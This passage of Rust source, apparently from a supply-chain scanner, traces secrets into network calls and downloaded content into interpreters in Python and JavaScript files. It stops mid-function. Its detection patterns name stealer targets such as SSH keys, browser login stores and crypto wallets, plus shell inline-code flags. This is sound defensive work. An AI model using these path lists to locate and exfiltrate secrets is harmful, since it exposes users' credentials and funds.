//! Variable-level data flow inside one file (Python, JS/TS): a secret that
//! reaches a network call, and downloaded content that reaches an
//! interpreter. The proximity chains in correlate.rs miss both once the read
//! and the send sit far apart or a few assignments away.
//!
//! Lexical, like zipslip.rs. The file is cut into statements at newlines and
//! `;`, a statement running on while a bracket is open (a multi-line dict
//! literal is one statement; a JS block brace is not). Statements are read
//! in order: an assignment, a mutation (`x.update(..)`, `x[k] = ..`,
//! `x.k = ..`) or a binding (`with .. as x`, `for x in ..`) passes taint from
//! its right side to the name on its left, and a later sink reports when its
//! arguments carry taint. Bundles are left to the proximity chains: a large
//! or minified file is skipped.
//!
//! Calls inside the file are followed through two summaries per function,
//! made before the walk: a function that hands one of its parameters to a
//! network sink is a sink for that argument (`send(tag, data)` wrapping
//! `req.write(data)`), and a call of a function that returns a secret
//! carries it (`collect()`). Wrappers are looked for twice, so a wrapper
//! around a wrapper is seen and a third level is not; what a function
//! returns is followed one level. Secrets only: with downloads the same
//! summaries read setuptools' `download_svn(url)` as running what was
//! fetched.
//!
//! shortcut: one namespace per file and no scopes, so two functions that
//! reuse a name share its taint; a value kept in a global by one function
//! and read by another that the file defines first is lost, and so is a
//! call into another file. Move to a real parser (tree-sitter) if that
//! over- or under-reaches. A first version that ignored statement order
//! flagged 53 of 526 clean packages (`process.env` in a fork option, then
//! an unrelated `.send()`).

use crate::correlate::{CREDENTIAL_EXFIL, DOWNLOAD_EXECUTE};
use crate::RuleMatch;
use regex::Regex;
use std::collections::HashMap;
use std::sync::LazyLock;

#[derive(Clone, Copy, PartialEq, Eq, Hash, Debug)]
enum Kind {
    /// The whole environment, an SSH key, a browser or wallet store.
    Secret,
    /// A response body or the output of `curl`.
    Download,
}

/// Where a taint came from, for the finding's context.
#[derive(Clone)]
struct Origin {
    line: usize,
    what: String,
    /// The name holds the environment mapping itself (`env = process.env`, a
    /// copy, an object with it inside) or is a parameter being summarised.
    /// Such a value counts where it is serialised or handed to a sink; a
    /// field read from it (`env.TOKEN`) or a helper called with it
    /// (`baseUrl(env)`) is one setting. False for anything derived
    /// (`JSON.stringify(env)`, `body.substring(…)`).
    alias: bool,
}

struct Stmt {
    line: usize,
    text: String,
    /// The innermost named function this statement is in (`Func` index).
    func: Option<usize>,
    /// A function's own header (`function f(a)`, `def f(a):`), not a call.
    is_def: bool,
}

/// A named function of the file. Callbacks and blocks without a name belong
/// to the function around them.
struct Func {
    name: String,
    /// First identifier of each parameter, by position; empty when the
    /// parameter is a pattern.
    params: Vec<String>,
    parent: Option<usize>,
}

/// A function of the file that passes one of its parameters to a network
/// sink.
struct SinkFunc {
    call: Regex,
    name: String,
    param: usize,
    param_name: String,
}

/// What the walk knows about the file besides the statements.
struct Cx<'a> {
    raw_http: bool,
    net_sink: &'a Regex,
    code_sink: &'a Regex,
    sink_funcs: Vec<SinkFunc>,
    /// Functions of the file that return what one of their parameters holds
    /// (`collect(env)` that walks it): a call of one keeps the value.
    passers: Vec<String>,
    /// Functions that return a secret: name, a call of it, what comes back.
    returns: Vec<(String, Regex, Kind, Origin)>,
}

struct Hit {
    name: &'static str,
    origin: Origin,
    line: usize,
    sink: String,
}

type Taint = HashMap<String, (Kind, Origin)>;

/// The origin of a parameter seeded as tainted while a function is
/// summarised: no real origin starts with `\0`.
const PARAM: char = '\0';

/// Paths only a stealer reads. Not `~/.aws/credentials`, `.npmrc` or
/// `.netrc`: SDKs and package managers read those to sign their own requests.
/// `'.ssh'` as a path part of its own (`join(home, '.ssh')`) counts. `'.env'`
/// does not: tried, and a tool that reads its own API key from `.env` and
/// sends it to that API looks the same (mcp-serper-search).
static SECRET_PATH: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?i)(?:\.ssh/|id_rsa|id_ed25519|id_ecdsa|Login Data|Local State|Local Storage/leveldb|wallet\.dat|\.electrum|Exodus/|\.git-credentials|keychain-db|['"]\.ssh['"])"#)
        .unwrap()
});

static DOWNLOAD_SRC: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?:(?:^|\W)urlopen\s*\(|requests\.(?:get|post|request)\s*\(|httpx\.(?:get|post|stream)\s*\(|(?:^|[^\w.])fetch\s*\(|axios(?:\.(?:get|post|request))?\s*\(|https?\.get\s*\(|(?:^|[^\w.])got\s*\(|["'](?:curl|wget)["']|["'`](?:curl|wget)\s)"#)
        .unwrap()
});

static NET_SINK_PY: LazyLock<Regex> = LazyLock::new(|| {
    // Not a bare `.patch(`: `mock.patch("os.environ", …)` in a test.
    Regex::new(r#"(?:requests\.(?:post|put|patch|request|get)|(?:^|\W)urlopen|\.(?:post|put|request|sendall|sendto|sendmail|send_message)|gethostbyname|getaddrinfo)\s*\("#)
        .unwrap()
});
/// Named network APIs only: `.send()` and `.post()` are IPC, Express
/// responses and router methods far more often than requests.
static NET_SINK_JS: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?:(?:^|[^\w.])fetch|axios(?:\.(?:post|put|patch|request|get))?|sendBeacon|(?:^|[^\w.])got(?:\.\w+)?|(?:^|[^\w.])needle|dns\.(?:lookup|resolve\w*))\s*\("#)
        .unwrap()
});

/// `req.write(data)` / `req.end(data)` send only when the file speaks raw HTTP.
static RAW_HTTP: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?:https?\.request|net\.(?:connect|Socket|createConnection)|tls\.connect)\s*\("#)
        .unwrap()
});
static STREAM_SINK: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r#"\.(?:write|end)\s*\("#).unwrap());

/// Not `eval`: Python's runs one expression, and scrapers misuse it to parse
/// responses (`eval(r.text)`); downloaded code goes through `exec`.
static CODE_SINK_PY: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?:(?:^|[^\w.])(?:exec|compile)|os\.system|os\.popen|subprocess\.\w+)\s*\("#)
        .unwrap()
});
static CODE_SINK_JS: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?:(?:^|[^\w.])eval|new\s+Function|(?:^|[^\w.])Function|vm\.run\w*|execSync|spawnSync|spawn|child_process\.exec)\s*\("#)
        .unwrap()
});
/// A subprocess or `spawn` call runs downloaded content only through an
/// inline-code flag (`node -e`, `python -c`) or a shell.
static INLINE_CODE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?:(?:["'](?:node|python3?|bash|sh|zsh|perl|ruby|pwsh|powershell|cmd)(?:\.exe)?["']|process\.execPath)\s*,\s*\[?\s*["'](?:-e|-c|--eval|-Command|/c)["']|shell\s*[=:]\s*[Tt]rue)"#)
        .unwrap()
});

/// A call whose value is the output of the command it is given.
static RUNS_COMMAND: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?:subprocess\.\w+|os\.popen|getoutput|execSync|spawnSync|execFileSync|(?:^|[^\w.])(?:exec|run|popen|check_output))\s*\(").unwrap()
});

static STARTS_PROCESS: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?:Popen|subprocess\.\w+|spawn\w*|fork|exec\w*)\s*\(").unwrap());
static CHILD_ENV: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\benv\s*[=:]\s*(?:\{[^{}]*\}|[\w.]+)").unwrap());

static WITH_AS: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?:^|,)\s*(?:async\s+)?(?:with\s+)?(.+?)\s+as\s+([A-Za-z_]\w*)").unwrap()
});
static FOR_IN: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"^\s*for\s*\(?\s*(?:const|let|var)?\s*([\w$,\s\[\]{}]+?)\s+(?:in|of)\s+(.+)")
        .unwrap()
});
static MUTATE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"([A-Za-z_$][\w$]*(?:\.[A-Za-z_$][\w$]*)?)\.(?:update|append|extend|push|add|set|insert|setdefault)\s*\(").unwrap()
});
static IDENT: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"[A-Za-z_$][\w$]*(?:\.[A-Za-z_$][\w$]*)?").unwrap());

/// The text before a JS block's `{` when it is a named function: `function
/// f(a)`, `f = (a) =>`, `f: function (a)`, `f = a =>`, a method `f(a)`.
/// Groups: (1,2), (3,4), (5,6), (7,8) are name and parameters.
static JS_FUNC: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?:function\s*\*?\s*([\w$]+)\s*\(([^()]*)\)|([\w$]+)\s*[:=]\s*(?:async\s*)?(?:function\s*\*?\s*[\w$]*\s*)?\(([^()]*)\)|([\w$]+)\s*[:=]\s*(?:async\s+)?([\w$]+)\s*=>|^\s*(?:(?:async|static|export|default)\s+)*([\w$]+)\s*\(([^()]*)\))(?:\s*:\s*[\w$<>\[\]|., ]+)?\s*(?:=>)?\s*$").unwrap()
});
/// TypeScript's output for an async arrow function: `f = (a, b) =>
/// __awaiter(void 0, void 0, void 0, function* ()`. With default values the
/// generator carries the real parameter names (group 3).
static TS_ASYNC: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"([\w$]+)\s*=\s*\(([^()]*)\)\s*=>\s*__awaiter\((?:[^()]|\([^()]*\))*,\s*function\s*\*\s*\(([^()]*)\)\s*$").unwrap()
});
/// `promise.then((value) =>`: the callback's parameter is what the promise
/// resolves to.
static THEN: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"^(.*?)\.then\(\s*(?:async\s*)?(?:function\s*[\w$]*\s*)?\(?\s*([A-Za-z_$][\w$]*)")
        .unwrap()
});
static PY_DEF: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"^\s*(?:async\s+)?def\s+(\w+)\s*\((.*)\)\s*(?:->[^:]*)?:\s*$").unwrap()
});
const NOT_FUNCTIONS: &[&str] = &[
    "if", "for", "while", "switch", "catch", "with", "function", "return", "typeof", "await", "do",
    "else",
];

/// Chains for one file, `Chain: Credential Exfiltration` and `Chain: Download
/// and Execute`, the same names the proximity chains use.
pub fn flows(rel_path: &str, content: &str) -> Vec<RuleMatch> {
    let lower = rel_path.to_ascii_lowercase();
    let python = lower.ends_with(".py");
    let js = [".js", ".mjs", ".cjs", ".ts", ".jsx", ".tsx"]
        .iter()
        .any(|e| lower.ends_with(e));
    if !python && !js {
        return Vec::new();
    }
    // A 300 KB bundle chunk reuses `res` and `result` in hundreds of
    // functions (lerna); the scripts this is for are a few KB.
    const MAX_BYTES: usize = 64 * 1024;
    if content.len() > MAX_BYTES || content.lines().any(|l| l.len() > 4000) {
        return Vec::new();
    }
    let (stmts, funcs) = statements(content, python);
    let mut cx = Cx {
        raw_http: js && RAW_HTTP.is_match(content),
        net_sink: if python { &NET_SINK_PY } else { &NET_SINK_JS },
        code_sink: if python { &CODE_SINK_PY } else { &CODE_SINK_JS },
        sink_funcs: Vec::new(),
        passers: Vec::new(),
        returns: Vec::new(),
    };
    summarize(&stmts, &funcs, &mut cx);
    let (hits, _) = walk(stmts.iter(), &mut Taint::new(), &cx);
    hits.iter()
        .map(|h| flow(rel_path, h.name, &h.origin, h.line, &h.sink))
        .collect()
}

/// Statements in order: a sink sees only what earlier statements tainted.
/// Returns the first hit per chain and the taint of the first `return` that
/// carries any.
fn walk<'a>(
    stmts: impl Iterator<Item = &'a Stmt>,
    taint: &mut Taint,
    cx: &Cx,
) -> (Vec<Hit>, Option<(Kind, Origin)>) {
    let mut hits: Vec<Hit> = Vec::new();
    let mut returned = None;
    for s in stmts.filter(|s| !s.is_def) {
        // `@router.post('/hook')` declares a route; it sends nothing.
        let decorator = s.text.trim_start().starts_with('@');
        for (sink, kind, name) in [
            (cx.net_sink, Kind::Secret, CREDENTIAL_EXFIL),
            (cx.code_sink, Kind::Download, DOWNLOAD_EXECUTE),
        ] {
            if decorator || hits.iter().any(|h| h.name == name) {
                continue;
            }
            let mut hit = |origin: Origin, sink: &str| {
                hits.push(Hit {
                    name,
                    origin,
                    line: s.line,
                    sink: sink.to_string(),
                })
            };
            let mut found = false;
            for m in sink.find_iter(&s.text) {
                let args = call_args(&s.text, m.end() - 1);
                // A process started with downloaded data among its arguments
                // (a version, a URL, a pid) runs that program, not the data.
                if name == DOWNLOAD_EXECUTE
                    && (m.as_str().contains("subprocess") || m.as_str().contains("spawn"))
                    && !INLINE_CODE.is_match(args)
                {
                    continue;
                }
                if let Some((_, origin)) = carried(args, s.line, taint, Some(kind), cx) {
                    hit(origin, m.as_str());
                    found = true;
                    break;
                }
            }
            if cx.raw_http && kind == Kind::Secret && !found {
                for m in STREAM_SINK.find_iter(&s.text) {
                    let args = call_args(&s.text, m.end() - 1);
                    if let Some((_, origin)) = carried(args, s.line, taint, Some(kind), cx) {
                        hit(origin, m.as_str());
                        found = true;
                        break;
                    }
                }
            }
            // A function of this file that hands the argument to a sink.
            for f in &cx.sink_funcs {
                if found || kind != Kind::Secret {
                    break;
                }
                for m in f.call.find_iter(&s.text) {
                    let args = split_args(call_args(&s.text, m.end() - 1));
                    let keyword = format!("{}=", f.param_name);
                    let arg = args
                        .iter()
                        .find(|a| a.trim_start().starts_with(&keyword))
                        .or(args.get(f.param));
                    let got = arg.and_then(|a| carried(a, s.line, taint, Some(kind), cx));
                    if let Some((_, origin)) = got {
                        hit(origin, &format!("{}(", f.name));
                        found = true;
                        break;
                    }
                }
            }
        }
        if returned.is_none() {
            // `return x`, not `returns = x`.
            let value = s.text.trim_start().strip_prefix("return");
            if let Some(value) =
                value.filter(|v| !v.starts_with(|c: char| c.is_alphanumeric() || c == '_'))
            {
                returned = carried(value, s.line, taint, None, cx);
            }
        }
        for (targets, rhs, element) in bindings(&s.text) {
            // The environment handed to a child process is not in the handle
            // that comes back (`info['popen'] = Popen(cmd, env=env)`, nbclassic).
            let rhs = if STARTS_PROCESS.is_match(rhs) {
                CHILD_ENV.replace_all(rhs, "")
            } else {
                rhs.into()
            };
            if let Some((kind, mut origin)) = carried(&rhs, s.line, taint, None, cx) {
                // One item of the environment is not the mapping.
                origin.alias &= !element;
                for t in targets {
                    taint.entry(t).or_insert((kind, origin.clone()));
                }
            }
        }
    }
    (hits, returned)
}

/// Fills `cx.sink_funcs` and `cx.returns`: each function's statements are
/// walked alone, once as they are (does a `return` carry a secret) and once
/// per parameter with that parameter tainted (does it reach a network sink).
fn summarize(stmts: &[Stmt], funcs: &[Func], cx: &mut Cx) {
    let inside = |s: &Stmt, f: usize| {
        let mut at = s.func;
        while let Some(i) = at {
            if i == f {
                return true;
            }
            at = funcs[i].parent;
        }
        false
    };
    let call = |name: &str| {
        let name = regex::escape(name);
        Regex::new(&format!(r"(?:(?:^|[^\w$.])|(?:this|self)\.){name}\s*\(")).unwrap()
    };
    // What each function returns, none seeing another's summary: one level.
    // Two levels made `gethostbyname(get_podman_hostname())` a leak of the
    // environment a helper passes to `podman` (ansible-core).
    let returns: Vec<_> = funcs
        .iter()
        .enumerate()
        .filter_map(|(i, f)| {
            let body = stmts.iter().filter(|s| inside(s, i));
            match walk(body, &mut Taint::new(), cx) {
                (_, Some((Kind::Secret, origin))) => {
                    Some((f.name.clone(), call(&f.name), Kind::Secret, origin))
                }
                _ => None,
            }
        })
        .collect();
    cx.returns = returns;
    // Twice: the second round sees the wrappers the first one found.
    for _ in 0..2 {
        for (i, f) in funcs.iter().enumerate() {
            for (param, name) in f.params.iter().enumerate() {
                let known = cx
                    .sink_funcs
                    .iter()
                    .any(|s| s.name == f.name && s.param == param);
                if name.is_empty() || known {
                    continue;
                }
                // One parameter at a time: the walk stops at the first hit.
                let origin = Origin {
                    line: 0,
                    what: PARAM.to_string(),
                    alias: true,
                };
                let mut taint = Taint::from([(name.clone(), (Kind::Secret, origin))]);
                let (hits, returned) = walk(stmts.iter().filter(|s| inside(s, i)), &mut taint, cx);
                if returned.is_some_and(|(_, origin)| origin.what.starts_with(PARAM))
                    && !cx.passers.contains(&f.name)
                {
                    cx.passers.push(f.name.clone());
                }
                if hits.iter().any(|h| h.origin.what.starts_with(PARAM)) {
                    cx.sink_funcs.push(SinkFunc {
                        call: call(&f.name),
                        name: f.name.clone(),
                        param,
                        param_name: name.clone(),
                    });
                }
            }
        }
    }
}

/// Arguments of a call, cut at top-level commas.
fn split_args(args: &str) -> Vec<&str> {
    let mut out = Vec::new();
    let (mut depth, mut start) = (0i32, 0);
    let mut quote: Option<char> = None;
    let mut prev = '\0';
    for (i, c) in args.char_indices() {
        match quote {
            Some(q) => {
                if c == q && prev != '\\' {
                    quote = None;
                }
            }
            None => match c {
                '"' | '\'' | '`' => quote = Some(c),
                '(' | '[' | '{' => depth += 1,
                ')' | ']' | '}' => depth -= 1,
                ',' if depth == 0 => {
                    out.push(&args[start..i]);
                    start = i + 1;
                }
                _ => {}
            },
        }
        prev = c;
    }
    out.push(&args[start..]);
    out
}

/// Parameter names by position. Python's `self` / `cls` are not arguments
/// of the call.
fn params(list: &str) -> Vec<String> {
    let names: Vec<String> = split_args(list)
        .into_iter()
        .map(|p| {
            let p = p.trim().trim_start_matches(['*', '.']);
            let end = p
                .find(|c: char| !(c.is_alphanumeric() || c == '_' || c == '$'))
                .unwrap_or(p.len());
            p[..end].to_string()
        })
        .collect();
    match names.first().map(String::as_str) {
        Some("self" | "cls") => names[1..].to_vec(),
        _ => names,
    }
}

fn flow(rel_path: &str, name: &str, origin: &Origin, line: usize, sink: &str) -> RuleMatch {
    let sink = sink.trim_start_matches(|c: char| !c.is_alphanumeric() && c != '.');
    RuleMatch {
        file_path: rel_path.to_string(),
        line_number: line,
        matched_pattern: name.to_string(),
        severity: "critical".to_string(),
        context: format!(
            "data flow: {} (line {}) reaches {}) (line {})",
            origin.what, origin.line, sink, line
        ),
    }
}

/// The taint `text` carries: a source in it, or a tainted name it mentions.
/// `want`: only that kind (a sink); `None`: any, secrets first (a binding).
/// A download source inside a sink's own arguments is the sink running
/// `curl -o file`, not running what came back, so sinks need a variable.
fn carried(
    text: &str,
    line: usize,
    taint: &Taint,
    want: Option<Kind>,
    cx: &Cx,
) -> Option<(Kind, Origin)> {
    let wants = |k: Kind| want.is_none_or(|w| w == k);
    let code = code_only(text);
    let found_in = mentions(&code);
    if wants(Kind::Secret) {
        // The environment itself, where it is not one variable of it or an
        // argument of some helper.
        let env = found_in.iter().find_map(|(name, mention, at)| {
            let alias = match (*mention, around(&code, *at, &cx.passers)) {
                (Mention::Pick, _) | (Mention::Bare, Around::Opaque) => return None,
                (Mention::Bare, Around::Top) => true,
                _ => false,
            };
            ["process.env", "os.environ"]
                .contains(&name.as_str())
                .then(|| (name.clone(), alias))
        });
        let path = || secret_path(text).map(|what| (what, false));
        if let Some((what, alias)) = env.or_else(path) {
            return Some((Kind::Secret, Origin { line, what, alias }));
        }
    }
    if want.is_none() {
        // A call in the code, or `curl` / `wget` in a string. A `fetch(` inside
        // a string is a script for another process (`node -e`), not a call.
        let call = DOWNLOAD_SRC.find(&code).map(|m| (m.as_str(), true));
        let found = call.or_else(|| {
            let m = DOWNLOAD_SRC.find(text)?;
            let word = m
                .as_str()
                .trim_start_matches(|c: char| !c.is_alphanumeric());
            // `cmd = 'curl -o f url'` is a command line: running `cmd` later
            // runs curl, not what curl fetched (ckan-cloud-operator). Only
            // the output of a call that runs it is a download.
            ((word.starts_with("curl") || word.starts_with("wget"))
                && RUNS_COMMAND.is_match(&text[..m.start()]))
            .then_some((m.as_str(), false))
        });
        if let Some((what, _)) = found {
            let what = what
                .trim_start_matches(|c: char| !c.is_alphanumeric())
                .to_string();
            let alias = false;
            return Some((Kind::Download, Origin { line, what, alias }));
        }
    }
    // Secrets first: a request built from a downloaded URL and a stolen
    // body carries the secret (env-loader-cli).
    let mut found: Vec<(Kind, Origin)> = cx
        .returns
        .iter()
        .filter(|(_, call, ..)| call.is_match(text))
        .map(|(_, _, kind, origin)| (*kind, origin.clone()))
        .collect();
    found.extend(found_in.iter().filter_map(|(name, mention, at)| {
        let (kind, origin) = taint.get(name)?;
        let mut origin = origin.clone();
        if origin.alias {
            origin.alias = match (*mention, around(&code, *at, &cx.passers)) {
                (Mention::Pick, _) | (Mention::Bare, Around::Opaque) => return None,
                (Mention::Bare, Around::Top) => true,
                _ => false,
            };
        }
        Some((*kind, origin))
    }));
    found.retain(|(k, _)| wants(*k));
    let secret = found.iter().position(|(k, _)| *k == Kind::Secret);
    (!found.is_empty()).then(|| found.swap_remove(secret.unwrap_or(0)))
}

/// Calls whose result still holds what they were given, as text or a list:
/// the environment through `JSON.stringify` or `.items()` is the environment.
const SERIALISERS: &[&str] = &[
    "stringify",
    "dumps",
    "dump",
    "entries",
    "keys",
    "values",
    "items",
    "fromEntries",
    "str",
    "repr",
    "list",
    "tuple",
    "sorted",
    "urlencode",
    "quote",
    "encodeURIComponent",
    "encodeURI",
    "btoa",
    "b64encode",
    "from",
    "encode",
    "inspect",
    "String",
    "format",
    "join",
    "concat",
    "Buffer",
    "bytes",
    "toString",
    "serialize",
];
/// Calls that give back the same mapping again: a field read from
/// `dict(os.environ)` is still one variable.
const COPIERS: &[&str] = &[
    "dict",
    "copy",
    "deepcopy",
    "assign",
    "structuredClone",
    "cloneDeep",
    "merge",
];

/// What stands around a mention at byte `at` of code without its strings.
#[derive(Clone, Copy, PartialEq)]
enum Around {
    /// Nothing but literals and grouping: the value itself.
    Top,
    /// The argument of a call in `SERIALISERS`, or of a function of the file
    /// that returns what it was given.
    Serialiser,
    /// The argument of any other call: what comes back is not known to be
    /// the value (`baseUrl(env)`, `spawn(cmd, { env })`).
    Opaque,
}

fn around(code: &str, at: usize, passers: &[String]) -> Around {
    let bytes = code.as_bytes();
    let mut depth = 0;
    let mut i = at.min(bytes.len());
    while i > 0 {
        i -= 1;
        match bytes[i] {
            b')' | b']' | b'}' => depth += 1,
            b'(' | b'[' | b'{' if depth > 0 => depth -= 1,
            b'(' => {
                let head = code[..i].trim_end();
                let start = head
                    .rfind(|c: char| !(c.is_alphanumeric() || "_$.".contains(c)))
                    .map_or(0, |p| p + 1);
                let callee = head[start..].rsplit('.').next().unwrap_or_default();
                // Grouping, a keyword before the parenthesis or a copy of the
                // value: look further out.
                if callee.is_empty() || NOT_FUNCTIONS.contains(&callee) || COPIERS.contains(&callee)
                {
                    continue;
                }
                return if SERIALISERS.contains(&callee) || passers.iter().any(|p| p == callee) {
                    Around::Serialiser
                } else {
                    Around::Opaque
                };
            }
            _ => {}
        }
    }
    Around::Top
}

/// A stealer-only path in the text, strings included.
fn secret_path(text: &str) -> Option<String> {
    // `~/.ssh/id_rsa.pub` is a public key: sent to be signed (unskript).
    SECRET_PATH
        .find_iter(text)
        .find(|m| {
            let quoted = m.as_str().starts_with(['"', '\'']);
            !(quoted && (text.contains(".pub\"") || text.contains(".pub'")))
                && !text[m.end()..]
                    .split(['"', '\'', '`'])
                    .next()
                    .unwrap_or_default()
                    .ends_with(".pub")
        })
        .map(|m| m.as_str().to_string())
}

/// `(targets, right side, element)` for each binding in one statement;
/// `element`: the targets are items of the right side (`for x in xs`), not it.
fn bindings(text: &str) -> Vec<(Vec<String>, &str, bool)> {
    let mut out = Vec::new();
    if let Some((lhs, rhs)) = split_assignment(text) {
        // `const { HOME, CI } = process.env` picks variables, not the lot.
        let picks = lhs
            .trim()
            .trim_start_matches(|c: char| c.is_alphabetic() || c.is_whitespace())
            .starts_with('{');
        if !(picks && ["process.env", "os.environ"].contains(&rhs.trim().trim_end_matches(';'))) {
            out.push((targets(lhs), rhs, false));
        }
    }
    let head = text.trim_start();
    if head.starts_with("with ") || head.starts_with("async with ") {
        for c in WITH_AS.captures_iter(text) {
            out.push((vec![c[2].to_string()], c.get(1).unwrap().as_str(), false));
        }
    }
    if let Some(c) = FOR_IN.captures(text) {
        out.push((
            targets(c.get(1).unwrap().as_str()),
            c.get(2).unwrap().as_str(),
            true,
        ));
    }
    if let Some(c) = THEN.captures(text) {
        out.push((vec![c[2].to_string()], c.get(1).unwrap().as_str(), false));
    }
    for c in MUTATE.captures_iter(text) {
        let target = base_name(&c[1]);
        if !NOT_VARIABLES.contains(&target.as_str()) {
            out.push((
                vec![target],
                call_args(text, c.get(0).unwrap().end() - 1),
                false,
            ));
        }
    }
    out
}

/// Left and right side of a top-level `=` (also `+=`, `|=`, ...), skipping
/// `==`, `<=`, `>=`, `!=` and `=>`.
fn split_assignment(text: &str) -> Option<(&str, &str)> {
    let b = text.as_bytes();
    let mut depth = 0i32;
    for i in 0..b.len() {
        match b[i] {
            b'(' | b'[' | b'{' => depth += 1,
            b')' | b']' | b'}' => depth -= 1,
            b'=' if depth == 0 => {
                let next = b.get(i + 1).copied();
                let prev = if i > 0 { b[i - 1] } else { 0 };
                if next == Some(b'=')
                    || next == Some(b'>')
                    || matches!(prev, b'=' | b'<' | b'>' | b'!')
                {
                    continue;
                }
                return Some((&text[..i], &text[i + 1..]));
            }
            _ => {}
        }
    }
    None
}

/// Names a left side binds: `x`, `a, b`, `{a, b}`, `obj.k` / `obj[k]` (the
/// object), `self.k` / `this.k` (the attribute, not the whole object).
fn targets(lhs: &str) -> Vec<String> {
    let lhs = lhs
        .trim()
        .trim_end_matches(|c: char| "+-*/|&%^:".contains(c));
    let lhs = lhs.split(':').next().unwrap_or(lhs); // `x: Dict = ...`
    idents(lhs)
        .into_iter()
        .map(|n| base_name(&n))
        .filter(|n| !NOT_VARIABLES.contains(&n.as_str()))
        .collect()
}

/// Module and global objects: `os.environ.update(..)` or `sys.path.append(..)`
/// must not taint every later `os.` / `sys.` mention.
const NOT_VARIABLES: &[&str] = &[
    "os", "sys", "json", "re", "path", "process", "console", "Object", "JSON", "Math", "window",
    "document", "module", "exports", "require", "const", "let", "var", "global", "nonlocal",
    "export", "await", "return",
];

fn base_name(name: &str) -> String {
    match name.split_once('.') {
        Some(("self" | "this", _)) => name.to_string(),
        Some((base, _)) => base.to_string(),
        None => name.to_string(),
    }
}

/// Identifiers outside string literals, plus those inside f-string and
/// template interpolations. `self.x` / `this.x` stay dotted.
fn idents(text: &str) -> Vec<String> {
    mentions(&code_only(text))
        .into_iter()
        .map(|(name, ..)| name)
        .collect()
}

/// How an identifier is mentioned.
#[derive(Clone, Copy, PartialEq)]
enum Mention {
    /// The name itself.
    Bare,
    /// A method called on it (`x.encode()`, `x.items()`): something derived.
    Method,
    /// One field of it (`x.name`, `x[k]`, `x?.name`, `x.get(k)`).
    Pick,
}

/// `text` without the contents of its string literals; f-string and
/// template interpolations stay.
fn code_only(text: &str) -> String {
    let mut code = String::with_capacity(text.len());
    let mut chars = text.chars().peekable();
    let mut prev = ' ';
    while let Some(c) = chars.next() {
        if matches!(c, '"' | '\'' | '`') {
            let interpolates = c == '`' || matches!(prev, 'f' | 'F');
            let mut depth = 0;
            let mut escaped = false;
            for d in chars.by_ref() {
                if escaped {
                    escaped = false;
                } else if d == '\\' {
                    escaped = true;
                } else if depth == 0 && d == c {
                    break;
                } else if interpolates && d == '{' {
                    depth += 1;
                    code.push(' ');
                } else if interpolates && d == '}' && depth > 0 {
                    depth -= 1;
                    code.push(' ');
                } else if depth > 0 {
                    code.push(d);
                }
            }
            code.push(' ');
            prev = ' ';
            continue;
        }
        code.push(c);
        prev = c;
    }
    code
}

/// Each identifier of `code` (see `code_only`) with how it is mentioned and
/// where. `process.env` and `os.environ` come back under those names.
fn mentions(code: &str) -> Vec<(String, Mention, usize)> {
    let how = |member: Option<&str>, after: &str| match member {
        _ if after.starts_with('[') || after.starts_with("?.") => Mention::Pick,
        Some(m) if COPIERS.contains(&m) && after.starts_with('(') => Mention::Bare,
        Some(m) if !after.starts_with('(') || ["get", "pop", "setdefault"].contains(&m) => {
            Mention::Pick
        }
        Some(_) => Mention::Method,
        None => Mention::Bare,
    };
    IDENT
        .find_iter(code)
        .map(|m| {
            let s = m.as_str();
            let after = code[m.end()..].trim_start();
            if matches!(s, "process.env" | "os.environ") {
                // `process.env.X`: the regex stops after one dot.
                let member = after.strip_prefix('.').map(|rest| {
                    let end = rest
                        .find(|c: char| !(c.is_alphanumeric() || c == '_' || c == '$'))
                        .unwrap_or(rest.len());
                    (&rest[..end], rest[end..].trim_start())
                });
                let mention = match member {
                    Some((name, rest)) => how(Some(name), rest),
                    None => how(None, after),
                };
                return (s.to_string(), mention, m.start());
            }
            match s.split_once('.') {
                Some(("self" | "this", _)) => (s.to_string(), how(None, after), m.start()),
                Some((base, member)) => (base.to_string(), how(Some(member), after), m.start()),
                None => (s.to_string(), how(None, after), m.start()),
            }
        })
        .collect()
}

/// The argument text of the call whose `(` is at byte `open`.
fn call_args(text: &str, open: usize) -> &str {
    let mut depth = 0i32;
    for (i, c) in text[open..].char_indices() {
        match c {
            '(' => depth += 1,
            ')' => {
                depth -= 1;
                if depth == 0 {
                    return &text[open + 1..open + i];
                }
            }
            _ => {}
        }
    }
    &text[(open + 1).min(text.len())..]
}

/// Statements with their first line, and the named functions they are in.
/// Strings and comments are kept out of the bracket count; a JS `{` after
/// `)`, `=>` or a keyword opens a block and separates statements instead of
/// continuing one. A Python function is its `def` and what is indented
/// under it.
fn statements(content: &str, python: bool) -> (Vec<Stmt>, Vec<Func>) {
    const MAX_STMT: usize = 8 * 1024;
    let mut out = Vec::new();
    let mut funcs: Vec<Func> = Vec::new();
    // Per open JS block, the function it is the body of.
    let mut scopes: Vec<Option<usize>> = Vec::new();
    let mut cur = String::new();
    let (mut line, mut start) = (1, 1);
    let mut depth = 0i32;
    // Bracket depth outside each open JS block.
    let mut blocks: Vec<i32> = Vec::new();
    let mut quote: Option<char> = None;
    let mut chars = content.chars().peekable();
    let mut prev = '\0';
    let flush = |cur: &mut String, out: &mut Vec<Stmt>, start: usize, func: Option<usize>| {
        if !cur.trim().is_empty() {
            out.push(Stmt {
                line: start,
                text: std::mem::take(cur),
                func,
                is_def: false,
            });
        }
        cur.clear();
    };
    let innermost = |scopes: &[Option<usize>]| scopes.iter().rev().flatten().next().copied();
